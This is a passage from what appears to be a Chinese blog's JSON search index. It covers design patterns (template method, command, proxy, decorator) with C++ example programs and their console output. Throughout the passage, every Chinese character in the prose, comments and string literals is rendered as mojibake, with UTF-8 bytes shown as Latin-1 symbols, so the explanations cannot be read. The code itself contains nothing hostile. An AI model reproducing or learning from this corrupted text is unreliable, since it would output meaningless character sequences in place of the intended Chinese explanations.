å¤ç”¨æŠ€æœ¯ï¼Œå®ƒåœ¨ç±»åº“è®¾è®¡ä¸­å°¤ä¸ºé‡è¦ï¼Œå®ƒæå–äº†ç±»åº“ä¸­çš„å…¬å…±è¡Œä¸ºï¼Œå°†å…¬å…±è¡Œä¸ºæ”¾åœ¨çˆ¶ç±»ä¸­ï¼Œè€Œé€šè¿‡å…¶å­ç±»æ¥å®ç°ä¸åŒçš„è¡Œä¸ºï¼Œå®ƒé¼“åŠ±æˆ‘ä»¬æ°å½“ä½¿ç”¨ç»§æ‰¿æ¥å®ç°ä»£ç å¤ç”¨ã€‚ å¯å®ç°ä¸€ç§åå‘æ§åˆ¶ç»“æ„ï¼Œé€šè¿‡å­ç±»è¦†ç›–çˆ¶ç±»çš„é’©å­æ–¹æ³•æ¥å†³å®šæŸä¸€ç‰¹å®šæ­¥éª¤æ˜¯å¦éœ€è¦æ‰§è¡Œã€‚ åœ¨æ¨¡æ¿æ–¹æ³•æ¨¡å¼ä¸­å¯ä»¥é€šè¿‡å­ç±»æ¥è¦†ç›–çˆ¶ç±»çš„åŸºæœ¬æ–¹æ³•ï¼Œä¸åŒçš„å­ç±»å¯ä»¥æä¾›åŸºæœ¬æ–¹æ³•çš„ä¸åŒå®ç°ï¼Œæ›´æ¢å’Œå¢åŠ æ–°çš„å­ç±»å¾ˆæ–¹ä¾¿ï¼Œç¬¦åˆå•ä¸€èŒè´£åŸåˆ™å’Œå¼€é—­åŸåˆ™ éœ€è¦ä¸ºæ¯ä¸€ä¸ªåŸºæœ¬æ–¹æ³•çš„ä¸åŒå®ç°æä¾›ä¸€ä¸ªå­ç±»ï¼Œå¦‚æœçˆ¶ç±»ä¸­å¯å˜çš„åŸºæœ¬æ–¹æ³•å¤ªå¤šï¼Œå°†ä¼šå¯¼è‡´ç±»çš„ä¸ªæ•°å¢åŠ ï¼Œç³»ç»Ÿæ›´åŠ åºå¤§ï¼Œè®¾è®¡ä¹Ÿæ›´åŠ æŠ½è±¡ã€‚ é€‚ç”¨åœºæ™¯ å…·æœ‰ç»Ÿä¸€çš„æ“ä½œæ­¥éª¤æˆ–æ“ä½œè¿‡ç¨‹ï¼› å…·æœ‰ä¸åŒçš„æ“ä½œç»†èŠ‚ï¼› å­˜åœ¨å¤šä¸ªå…·æœ‰åŒæ ·æ“ä½œæ­¥éª¤çš„åº”ç”¨åœºæ™¯ï¼Œä½†æŸäº›å…·ä½“çš„æ“ä½œç»†èŠ‚å´å„ä¸ç›¸åŒ åœ¨æŠ½è±¡ç±»ä¸­ç»Ÿä¸€æ“ä½œæ­¥éª¤ï¼Œå¹¶è§„å®šå¥½æ¥å£ï¼›è®©å­ç±»å®ç°æ¥å£ã€‚è¿™æ ·å¯ä»¥å§å„ä¸ªå…·ä½“çš„å­ç±»å’Œæ“ä½œæ­¥éª¤è§£è€¦åˆã€‚ å‘½ä»¤æ¨¡å¼ å°†ä¸€ä¸ªè¯·æ±‚å°è£…ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œè®©æˆ‘ä»¬å¯ç”¨ä¸åŒçš„è¯·æ±‚å¯¹å®¢æˆ·è¿›è¡Œå‚æ•°åŒ–ï¼›å¯¹è¯·æ±‚æ’é˜Ÿæˆ–è€…è®°å½•è¯·æ±‚æ—¥å¿—ï¼Œä»¥åŠæ”¯æŒå¯æ’¤é”€çš„æ“ä½œã€‚å‘½ä»¤æ¨¡å¼æ˜¯ä¸€ç§å¯¹è±¡è¡Œä¸ºæ¨¡å¼ï¼Œå…¶åˆ«åä¸ºåŠ¨ä½œ(Action)æ¨¡å¼æˆ–äº‹åŠ¡ï¼ˆTranactionï¼‰æ¨¡å¼ã€‚ å‘½ä»¤æ¨¡å¼å¯ä»¥å°†è¯·æ±‚å‘é€è€…å’Œæ¥æ”¶è€…å®Œå…¨è§£è€¦ï¼Œå‘é€è€…ä¸æ¥æ”¶è€…ä¹‹é—´æ²¡æœ‰ç›´æ¥å¼•ç”¨å…³ç³»ï¼Œå‘é€è¯·æ±‚çš„å¯¹è±¡åªéœ€è¦çŸ¥é“å¦‚ä½•å‘é€è¯·æ±‚ï¼Œè€Œä¸å¿…çŸ¥é“å¦‚ä½•å®Œæˆè¯·æ±‚ã€‚ ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273// å‘½ä»¤æ¨¡å¼.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;using namespace std;class Doctor&#123;public: void treat_eye() &#123; cout &lt;&lt; &quot;åŒ»ç”Ÿ æ²»ç–— çœ¼ç§‘ç—…&quot; &lt;&lt; endl; &#125; void treat_nose() &#123; cout &lt;&lt; &quot;åŒ»ç”Ÿ æ²»ç–— é¼»ç§‘ç—…&quot; &lt;&lt; endl; &#125;protected:private:&#125;;class CommandTreatEye &#123;public: CommandTreatEye(Doctor *doctor) &#123; m_doctor = doctor; &#125; void treat() &#123; m_doctor-&gt;treat_eye(); &#125;private: Doctor *m_doctor;&#125;;class CommandTreatNose &#123;public: CommandTreatNose(Doctor *doctor) &#123; m_doctor = doctor; &#125; void treat() &#123; m_doctor-&gt;treat_nose(); &#125;private: Doctor *m_doctor;&#125;;int main()&#123; // 1. åŒ»ç”Ÿç›´æ¥çœ‹ç—… Doctor *doctor = new Doctor; doctor-&gt;treat_eye(); delete doctor; cout &lt;&lt; &quot;-----------------&quot; &lt;&lt; endl; // 2. é€šè¿‡åŒ»ç–—æŒ‡ä»¤æ¥çœ‹ç—… Doctor *doctorCmd = new Doctor; CommandTreatEye * cmdEyeDoc = new CommandTreatEye(doctorCmd); cmdEyeDoc-&gt;treat(); delete cmdEyeDoc; CommandTreatNose *cmdNoseDoc = new CommandTreatNose(doctorCmd); cmdNoseDoc-&gt;treat(); delete cmdNoseDoc; delete doctorCmd; return 0;&#125; è¾“å‡ºï¼š åŒ»ç”Ÿ æ²»ç–— çœ¼ç§‘ç—… ----------------- åŒ»ç”Ÿ æ²»ç–— çœ¼ç§‘ç—… åŒ»ç”Ÿ æ²»ç–— é¼»ç§‘ç—… è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . . > å‘½ä»¤æ¨¡å¼çš„æœ¬è´¨æ˜¯å¯¹è¯·æ±‚è¿›è¡Œå°è£…å¯¹åº”äºä¸€ä¸ªå‘½ä»¤ï¼Œå°†å‘å‡ºå‘½ä»¤çš„è´£ä»»å’Œæ‰§è¡Œå‘½ä»¤çš„è´£ä»»åˆ†å‰²å¼€ã€‚ å‘½ä»¤æ¨¡å¼ä¸­çš„è§’è‰²å’ŒèŒè´£ ç­–ç•¥æ¨¡å¼ è§‚å¯Ÿè€…æ¨¡å¼","tags":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"è®¾è®¡æ¨¡å¼/è¡Œä¸ºå‹æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼-è¡Œä¸ºå‹æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"B_è®¾è®¡æ¨¡å¼","slug":"A-å†…åŠŸ/B-è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"è®¾è®¡æ¨¡å¼ä¹‹ç»“æ„å‹æ¨¡å¼","date":"2023-12-25T01:28:27.245Z","path":"A_å†…åŠŸ/B_è®¾è®¡æ¨¡å¼/ç»“æ„å‹æ¨¡å¼/","text":"ç»“æ„å‹æ¨¡å¼ å­¦ä¹ ç¬”è®°ä¹‹C++è®¾è®¡æ¨¡å¼â€”â€”åˆ›å»ºå‹æ¨¡å¼ ğŸ“‘ è®¾è®¡æ¨¡å¼ä¹‹åˆ›å»ºå‹æ¨¡å¼ ğŸ“‘ è®¾è®¡æ¨¡å¼ä¹‹è¡Œä¸ºå‹æ¨¡å¼ Proxyæ¨¡å¼åˆå«åšä»£ç†æ¨¡å¼ï¼Œæ˜¯æ„é€ å‹çš„è®¾è®¡æ¨¡å¼ä¹‹ä¸€ï¼Œ å®ƒå¯ä»¥ä¸ºå…¶ä»–å¯¹è±¡æä¾›-ç§ä»£ç†( Proxy )ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚æ‰€è°“ä»£ç†ï¼Œæ˜¯æŒ‡å…·æœ‰ä¸ä»£ç†å…ƒ(è¢«ä»£ç†çš„å¯¹è±¡)å…·æœ‰ç›¸åŒçš„æ¥å£çš„ç±»ï¼Œå®¢æˆ·ç«¯å¿…é¡»é€šè¿‡ä»£ç†ä¸è¢«ä»£ç†çš„ç›®æ ‡ç±»äº¤äº’ï¼Œè€Œä»£ç†ä¸€-èˆ¬åœ¨äº¤äº’çš„è¿‡ç¨‹ä¸­ (äº¤äº’å‰å) , è¿›è¡ŒæŸäº›ç‰¹åˆ«çš„å¤„ç†ã€‚ ä»£ç†æ¨¡å¼ é€šä¿—ç†è§£å°±å’Œæµ·å¤–ä»£è´­ç±»ä¼¼ï¼Œç”±ä¸€ä¸ªæµ·å¤–ä»£è´­ä¸“é—¨è´Ÿè´£æ‰€æœ‰éœ€è¦ä»å…¶ä»–å›½å®¶è´­ä¹°çš„è¿™ä¸ªè¡Œä¸ºã€‚ ä»¥ä¸‹ä¸ºä»£ç†æ¨¡å¼æ¡ˆä¾‹åŠå…¶ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102// ä»£ç†æ¨¡å¼.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚//#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Item&#123;public: Item(string kind, bool fact) &#123; this-&gt;kind = kind; this-&gt;fact = fact; &#125; string getKind() &#123; return kind; &#125; bool getFact() &#123; return fact; &#125;protected:private: string kind; bool fact;&#125;;// æŠ½è±¡çš„è´­ç‰©æ–¹å¼class Shopping&#123;public: virtual void buy(Item *it) = 0;protected:private:&#125;;class KoeraShopping : public Shopping&#123;public: void buy(Item *it) &#123; cout &lt;&lt; &quot;å»éŸ©å›½ä¹°äº†&quot; &lt;&lt; it-&gt;getKind() &lt;&lt; endl; &#125;protected:private:&#125;;class USAShopping : public Shopping&#123;public: void buy(Item * it) &#123; cout &lt;&lt; &quot;å»ç¾å›½ä¹°äº†&quot; &lt;&lt; it-&gt;getKind() &lt;&lt; endl; &#125;protected:private:&#125;;// æµ·å¤–ä»£ç†class OverseasProxy : public Shopping&#123;public: OverseasProxy(Shopping *shopping) &#123; this-&gt;shopping = shopping; &#125; virtual void buy(Item *it) &#123; if (it-&gt;getFact() == true) &#123; cout &lt;&lt; &quot;å‘ç°æ­£å“&quot; &lt;&lt; endl; shopping-&gt;buy(it); cout &lt;&lt; &quot;---------å®‰æ£€-----------&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;å‘ç°å‡è´§&quot; &lt;&lt; it-&gt;getKind() &lt;&lt; endl; &#125; &#125;protected:private: Shopping *shopping; // æœ‰ä¸€ä¸ªè´­ç‰©æ–¹å¼&#125;;int main()&#123; Item it1(&quot;nikeé‹å­&quot;, true); Item it2(&quot;CET4è¯ä¹¦&quot;, false); Shopping *Koerashopping = new KoeraShopping; Shopping *usaShopping = new USAShopping; Shopping *overseaProxy = new OverseasProxy(usaShopping); overseaProxy-&gt;buy(&amp;it1); overseaProxy-&gt;buy(&amp;it2); return 0;&#125; ä»£ç†æ¨¡å¼çš„ç§ç±» è¿œç¨‹ä»£ç†ï¼ˆRemote Proxyï¼‰ ä¸ºä¸€ä¸ªä½äºä¸åŒçš„åœ°å€ç©ºé—´çš„å¯¹è±¡æä¾›ä¸€ä¸ªæœ¬åœ°çš„ä»£ç†å¯¹è±¡ï¼Œè¿™ä¸ªä¸åŒçš„åœ°å€ç©ºé—´å¯ä»¥æ˜¯åœ¨åŒä¸€å°ä¸»æœºä¸­ï¼Œä¹Ÿå¯ä»¥æ˜¯åœ¨å¦å¤–ä¸€å°ä¸»æœºä¸­ï¼Œè¿œç¨‹ä»£ç†åˆç§°ä¸ºå¤§ä½¿ï¼ˆAmbassadorï¼‰ã€‚ è¿œç¨‹ä»£ç†ï¼š ä½¿å¾—å®¢æˆ·ç«¯ç¨‹åºå¯ä»¥è®¿é—®åœ¨è¿œç¨‹ä¸»æœºä¸Šçš„å¯¹è±¡ï¼Œè¿œç¨‹ä¸»æœºå¯èƒ½å…·æœ‰æ›´å¥½çš„è®¡ç®—æ€§èƒ½ä¸å¤„ç†é€Ÿåº¦ï¼Œå¯ä»¥å¿«é€Ÿç›¸åº”å¹¶å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚è¿œç¨‹ä»£ç†å¯ä»¥å°†ç½‘ç»œçš„ç»†èŠ‚éšè—èµ·æ¥ï¼Œä½¿å¾—å®¢æˆ·ç«¯ä¸å¿…è€ƒè™‘ç½‘ç»œçš„å­˜åœ¨ã€‚å®¢æˆ·ç«¯å®Œå…¨å¯ä»¥è®¤ä¸ºè¢«ä»£ç†çš„è¿œç¨‹ä¸šåŠ¡å¯¹è±¡æ˜¯åœ¨æœ¬åœ°è€Œä¸æ˜¯åœ¨è¿œç¨‹ï¼Œè€Œè¿œç¨‹ä»£ç†å¯¹è±¡æ‰¿æ‹…äº†å¤§éƒ¨åˆ†çš„ç½‘ç»œé€šä¿¡å·¥ä½œï¼Œå¹¶è´Ÿè´£å¯¹è¿œç¨‹ä¸šåŠ¡æ–¹æ³•çš„è°ƒç”¨ã€‚ å¦‚å›¾æ‰€ç¤º: å®¢æˆ·ç«¯å¯¹è±¡ä¸èƒ½ç›´æ¥è®¿é—®è¿œç¨‹ä¸»æœºä¸­çš„ä¸šåŠ¡å¯¹è±¡ï¼Œåªèƒ½é‡‡å–é—´æ¥è®¿é—®çš„æ–¹å¼ã€‚è¿œç¨‹ä¸šåŠ¡å¯¹è±¡åœ¨æœ¬åœ°ä¸»æœºä¸­æœ‰ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œè¯¥ä»£ç†å¯¹è±¡è´Ÿè´£å¯¹è¿œç¨‹ä¸šåŠ¡å¯¹è±¡çš„è®¿é—®å’Œç½‘ç»œé€šä¿¡ï¼Œå®ƒå¯¹äºå®¢æˆ·ç«¯å¯¹è±¡è€Œè¨€æ˜¯é€æ˜çš„ã€‚å®¢æˆ·ç«¯æ— é¡»å…³å¿ƒå®ç°å…·ä½“ä¸šåŠ¡çš„æ˜¯è°ï¼Œåªéœ€è¦æŒ‰ç…§æœåŠ¡æ¥å£æ‰€å®šä¹‰çš„æ–¹å¼ç›´æ¥ä¸æœ¬åœ°ä¸»æœºä¸­çš„ä»£ç†å¯¹è±¡äº¤äº’å³å¯ã€‚ åœ¨åŸºäº.NETå¹³å°çš„åˆ†å¸ƒå¼æŠ€æœ¯ï¼Œä¾‹å¦‚DCOMï¼ˆDistribute Component Object Mdoelï¼Œ åˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼‰ã€Web Serviceä¸­ï¼Œéƒ½åº”ç”¨äº†è¿œç¨‹ä»£ç†æ¨¡å¼ã€‚ è™šæ‹Ÿä»£ç†ï¼ˆVirtual Proxyï¼‰ å¦‚æœéœ€è¦åˆ›å»ºä¸€ä¸ªèµ„æºæ¶ˆè€—å·¨å¤§çš„å¯¹è±¡ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªæ¶ˆè€—ç›¸å¯¹è¾ƒå°çš„å¯¹è±¡æ¥è¡¨ç¤ºï¼ŒçœŸå®å¯¹è±¡åªåœ¨éœ€è¦æ—¶æ‰ä¼šè¢«çœŸæ­£åˆ›å»ºã€‚è™šæ‹Ÿä»£ç†(Virtual Proxy)ä¹Ÿæ˜¯ä¸€ç§å¸¸ç”¨çš„ä»£ç†æ¨¡å¼ï¼Œå¯¹äºä¸€äº›å ç”¨ç³»ç»Ÿèµ„æºè¾ƒå¤šæˆ–è€…åŠ è½½æ—¶é—´è¾ƒé•¿çš„å¯¹è±¡ï¼Œå¯ä»¥ç»™è¿™äº›å¯¹è±¡æä¾›ä¸€ä¸ªè™šæ‹Ÿä»£ç†ã€‚åœ¨çœŸå®å¯¹è±¡åˆ›å»ºæˆåŠŸä¹‹å‰è™šæ‹Ÿä»£ç†æ‰®æ¼”çœŸå®å¯¹è±¡çš„æ›¿èº«ï¼Œè€Œå½“çœŸå®å¯¹è±¡åˆ›å»ºä¹‹åï¼Œè™šæ‹Ÿä»£ç†å°†ç”¨æˆ·çš„è¯·æ±‚è½¬å‘ç»™çœŸå®å¯¹è±¡ã€‚ é€šå¸¸ï¼Œåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹å¯ä»¥è€ƒè™‘ä½¿ç”¨è™šæ‹Ÿä»£ç†ï¼š (1) ç”±äºå¯¹è±¡æœ¬èº«çš„å¤æ‚æ€§æˆ–è€…ç½‘ç»œç­‰åŸå› å¯¼è‡´ä¸€ä¸ªå¯¹è±¡éœ€è¦è¾ƒé•¿çš„åŠ è½½æ—¶é—´ï¼Œæ­¤æ—¶å¯ä»¥ç”¨ä¸€ä¸ªåŠ è½½æ—¶é—´ç›¸å¯¹è¾ƒçŸ­çš„ä»£ç†å¯¹è±¡æ¥ä»£è¡¨çœŸå®å¯¹è±¡ã€‚é€šå¸¸åœ¨å®ç°æ—¶å¯ä»¥ç»“åˆå¤šçº¿ç¨‹æŠ€æœ¯ï¼Œä¸€ä¸ªçº¿ç¨‹ç”¨äºæ˜¾ç¤ºä»£ç†å¯¹è±¡ï¼Œå…¶ä»–çº¿ç¨‹ç”¨äºåŠ è½½çœŸå®å¯¹è±¡ã€‚è¿™ç§è™šæ‹Ÿä»£ç†æ¨¡å¼å¯ä»¥åº”ç”¨åœ¨ç¨‹åºå¯åŠ¨çš„æ—¶å€™ï¼Œç”±äºåˆ›å»ºä»£ç†å¯¹è±¡åœ¨æ—¶é—´å’Œå¤„ç†å¤æ‚åº¦ä¸Šè¦å°‘äºåˆ›å»ºçœŸå®å¯¹è±¡ï¼Œå› æ­¤ï¼Œåœ¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œå¯ä»¥ç”¨ä»£ç†å¯¹è±¡ä»£æ›¿çœŸå®å¯¹è±¡åˆå§‹åŒ–ï¼Œå¤§å¤§åŠ é€Ÿäº†ç³»ç»Ÿçš„å¯åŠ¨æ—¶é—´ã€‚å½“éœ€è¦ä½¿ç”¨çœŸå®å¯¹è±¡æ—¶ï¼Œå†é€šè¿‡ä»£ç†å¯¹è±¡æ¥å¼•ç”¨ï¼Œè€Œæ­¤æ—¶çœŸå®å¯¹è±¡å¯èƒ½å·²ç»æˆåŠŸåŠ è½½å®Œæ¯•ï¼Œå¯ä»¥ç¼©çŸ­ç”¨æˆ·çš„ç­‰å¾…æ—¶é—´ã€‚ (2) å½“ä¸€ä¸ªå¯¹è±¡çš„åŠ è½½ååˆ†è€—è´¹ç³»ç»Ÿèµ„æºçš„æ—¶å€™ï¼Œä¹Ÿéå¸¸é€‚åˆä½¿ç”¨è™šæ‹Ÿä»£ç†ã€‚è™šæ‹Ÿä»£ç†å¯ä»¥è®©é‚£äº›å ç”¨å¤§é‡å†…å­˜æˆ–å¤„ç†èµ·æ¥éå¸¸å¤æ‚çš„å¯¹è±¡æ¨è¿Ÿåˆ°ä½¿ç”¨å®ƒä»¬çš„æ—¶å€™æ‰åˆ›å»ºï¼Œè€Œåœ¨æ­¤ä¹‹å‰ç”¨ä¸€ä¸ªç›¸å¯¹æ¥è¯´å ç”¨èµ„æºè¾ƒå°‘çš„ä»£ç†å¯¹è±¡æ¥ä»£è¡¨çœŸå®å¯¹è±¡ï¼Œå†é€šè¿‡ä»£ç†å¯¹è±¡æ¥å¼•ç”¨çœŸå®å¯¹è±¡ã€‚ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œåœ¨ç¬¬ä¸€æ¬¡å¼•ç”¨çœŸå®å¯¹è±¡æ—¶å†åˆ›å»ºå¯¹è±¡ï¼Œå¹¶ä¸”è¯¥å¯¹è±¡å¯è¢«å¤šæ¬¡é‡ç”¨ï¼Œåœ¨ä»¥åæ¯æ¬¡è®¿é—®æ—¶éœ€è¦æ£€æµ‹æ‰€éœ€å¯¹è±¡æ˜¯å¦å·²ç»è¢«åˆ›å»ºï¼Œå› æ­¤åœ¨è®¿é—®è¯¥å¯¹è±¡æ—¶éœ€è¦è¿›è¡Œå­˜åœ¨æ€§æ£€æµ‹ï¼Œè¿™éœ€è¦æ¶ˆè€—ä¸€å®šçš„ç³»ç»Ÿæ—¶é—´ï¼Œä½†æ˜¯å¯ä»¥èŠ‚çœå†…å­˜ç©ºé—´ï¼Œè¿™æ˜¯ä¸€ç§ç”¨æ—¶é—´æ¢å–ç©ºé—´çš„åšæ³•ã€‚ æ— è®ºæ˜¯ä»¥ä¸Šå“ªç§æƒ…å†µï¼Œè™šæ‹Ÿä»£ç†éƒ½æ˜¯ç”¨ä¸€ä¸ªâ€œè™šå‡â€çš„ä»£ç†å¯¹è±¡æ¥ä»£è¡¨çœŸå®å¯¹è±¡ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡æ¥é—´æ¥å¼•ç”¨çœŸå®å¯¹è±¡ï¼Œå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæé«˜ç³»ç»Ÿçš„æ€§èƒ½ã€‚ ä¿æŠ¤ä»£ç†ï¼ˆProtect Proxyï¼‰ æ§åˆ¶å¯¹ä¸€ä¸ªå¯¹è±¡çš„è®¿é—®ï¼Œå¯ä»¥ç»™ä¸åŒçš„ç”¨æˆ·æä¾›ä¸åŒçº§åˆ«çš„ä½¿ç”¨æƒé™ ç¼“å†²ä»£ç†ï¼ˆCache Proxyï¼‰ ä¸ºæŸä¸€ä¸ªç›®æ ‡æ“ä½œçš„ç»“æœæä¾›ä¸´æ—¶çš„å­˜å‚¨ç©ºé—´ï¼Œä»¥ä¾¿å¤šä¸ªå®¢æˆ·ç«¯å¯ä»¥å…±äº«è¿™äº›ç»“æœ ç¼“å†²ä»£ç†(Cache Proxy)ä¹Ÿæ˜¯ä¸€ç§è¾ƒä¸ºå¸¸ç”¨çš„ä»£ç†æ¨¡å¼ï¼Œå®ƒä¸ºæŸä¸€ä¸ªæ“ä½œçš„ç»“æœæä¾›ä¸´æ—¶çš„ç¼“å­˜å­˜å‚¨ç©ºé—´ï¼Œä»¥ä¾¿åœ¨åç»­ä½¿ç”¨ä¸­èƒ½å¤Ÿå…±äº«è¿™äº›ç»“æœï¼Œä»è€Œå¯ä»¥é¿å…æŸäº›æ–¹æ³•çš„é‡å¤æ‰§è¡Œï¼Œä¼˜åŒ–ç³»ç»Ÿæ€§èƒ½ã€‚ æ™ºèƒ½å¼•ç”¨ä»£ç†ï¼ˆSmart Reference Proxyï¼‰ å½“ä¸€ä¸ªå¯¹è±¡è¢«å¼•ç”¨æ—¶ï¼Œæä¾›ä¸€äº›é¢å¤–çš„æ“ä½œï¼Œä¾‹å¦‚å°†å¯¹è±¡è¢«è°ƒç”¨çš„æ¬¡æ•°è®°å½•ä¸‹æ¥ç­‰ã€‚ è£…é¥°æ¨¡å¼ è£…é¥°æ¨¡å¼ï¼ˆdecorator Patternï¼‰: åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡å¢åŠ ä¸€äº›é¢å¤–çš„èŒè´£ï¼Œå°±å¢åŠ å¯¹è±¡åŠŸèƒ½æ¥è¯´ï¼Œè£…é¥°æ¨¡å¼æ¯”ç”Ÿæˆå­ç±»å®ç°æ›´ä¸ºçµæ´»ã€‚è£…é¥°æ¨¡å¼æ˜¯ä¸€ç§å¯¹è±¡ç»“æ„å‹æ¨¡å¼ã€‚ æ¡ˆä¾‹ ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146// è£…é¥°æ¨¡å¼.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// ä¸€ä¸ªæŠ½è±¡çš„æ„ä»¶ï¼Œä»–æ˜¯å…·ä½“æ„ä»¶å’ŒæŠ½è±¡è£…é¥°ç±»çš„çˆ¶ç±» class Phone&#123;public: virtual void Show() = 0;protected:private:&#125;;// å…·ä½“çš„æ„ä»¶class iPhone : public Phone&#123;public: iPhone(string kind) &#123; this-&gt;kind = kind; &#125; virtual void Show() &#123; cout &lt;&lt; &quot;ç§€å‡ºäº† iPhone- &quot; &lt;&lt; kind &lt;&lt; &quot;:&quot; &lt;&lt; endl; &#125;protected:private: string kind;&#125;;// å…·ä½“çš„æ„ä»¶class Mi : public Phone&#123;public: Mi(string kind) &#123; this-&gt;kind = kind; &#125; virtual void Show() &#123; cout &lt;&lt; &quot;ç§€å‡ºäº† Mi-&quot; &lt;&lt; kind &lt;&lt; &quot;:&quot; &lt;&lt; endl; &#125;protected:private: string kind;&#125;;// æŠ½è±¡çš„æ‰‹æœºè£…é¥°ç±»ï¼Œå¿…é¡»åŒ…å«æŠ½è±¡çš„æ„ä»¶class DeCoratorPhone : public Phone&#123;public: DeCoratorPhone() &#123; &#125; DeCoratorPhone(Phone *phone) &#123; this-&gt;phone = phone; &#125; virtual void Show() &#123; this-&gt;phone-&gt;Show(); &#125;protected:private: Phone *phone;&#125;;// å…·ä½“çš„è£…é¥°å™¨class DeCoratorPhoneMo : public DeCoratorPhone &#123;public: DeCoratorPhoneMo(Phone *phone) &#123; this-&gt;phone = phone; &#125; virtual void Show() &#123; this-&gt;phone-&gt;Show(); addMo(); &#125; void addMo() &#123; cout &lt;&lt; &quot;è£…é¥°: æ‰‹æœºè´´è†œ&quot; &lt;&lt; endl; &#125;private: Phone *phone;&#125;;// å…·ä½“çš„è£…é¥°å™¨class DeCoratorPhoneKe : public DeCoratorPhone &#123;public: DeCoratorPhoneKe(Phone *phone) &#123; this-&gt;phone = phone; &#125; virtual void Show() &#123; this-&gt;phone-&gt;Show(); addMo(); &#125; void addMo() &#123; cout &lt;&lt; &quot;è£…é¥°: æ‰‹æœºè£…ä¿æŠ¤å£³&quot; &lt;&lt; endl; &#125;private: Phone *phone;&#125;;int main()&#123; Phone *phone = NULL; DeCoratorPhone * hasMoPhone = NULL; DeCoratorPhone * hasKePhone = NULL; DeCoratorPhone * hasMoKePhone = NULL; // å®šä¹‰ä¸€ä¸ªIphone 13æ‰‹æœº phone = new iPhone(&quot;iPhone 13&quot;); // ç»™æ™®é€šiphone åŠ ä¸Šè´´è†œ hasMoPhone = new DeCoratorPhoneMo(phone); // ç»™æ™®é€šiphone åŠ ä¸Šä¿æŠ¤å¥— hasKePhone = new DeCoratorPhoneKe(phone); hasMoPhone-&gt;Show(); hasKePhone-&gt;Show(); // ç»™æœ‰çš®å¥—çš„iphone åŠ ä¸Šè´´è†œ hasMoKePhone = new DeCoratorPhoneMo(hasKePhone); hasMoKePhone-&gt;Show(); delete hasMoKePhone; delete hasKePhone; delete hasMoPhone; delete phone; cout &lt;&lt; &quot;---------------------------------------&quot; &lt;&lt; endl; phone = new Mi(&quot;Mix 4&quot;); hasMoPhone = new DeCoratorPhoneMo(phone); hasKePhone = new DeCoratorPhoneKe(phone); hasMoPhone-&gt;Show(); hasKePhone-&gt;Show(); hasMoKePhone = new DeCoratorPhoneKe(hasKePhone); hasMoKePhone-&gt;Show(); delete hasMoKePhone; delete hasKePhone; delete hasMoPhone; delete phone; return 0;&#125; è¾“å‡ºï¼š ç§€å‡ºäº† iPhone- iPhone 13: è£…é¥°: æ‰‹æœºè´´è†œ ç§€å‡ºäº† iPhone- iPhone 13: è£…é¥°: æ‰‹æœºè£…ä¿æŠ¤å£³ ç§€å‡ºäº† iPhone- iPhone 13: è£…é¥°: æ‰‹æœºè£…ä¿æŠ¤å£³ è£…é¥°: æ‰‹æœºè´´è†œ ç§€å‡ºäº† Mi-Mix 4: è£…é¥°: æ‰‹æœºè´´è†œ ç§€å‡ºäº† Mi-Mix 4: è£…é¥°: æ‰‹æœºè£…ä¿æŠ¤å£³ ç§€å‡ºäº† Mi-Mix 4: è£…é¥°: æ‰‹æœºè£…ä¿æŠ¤å£³ è£…é¥°: æ‰‹æœºè£…ä¿æŠ¤å£³ è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . . ## è£…é¥°æ¨¡å¼çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ å¯¹äºæ‰©å±•ä¸€ä¸ªå¯¹è±¡çš„åŠŸèƒ½ï¼Œè£…é¥°æ¨¡å¼æ¯”ç»§æ‰¿æ›´åŠ çµæ´»ï¼Œä¸ä¼šå¯¼è‡´ç±»çš„ä¸ªæ•°æ€¥å‰§å¢åŠ ã€‚ 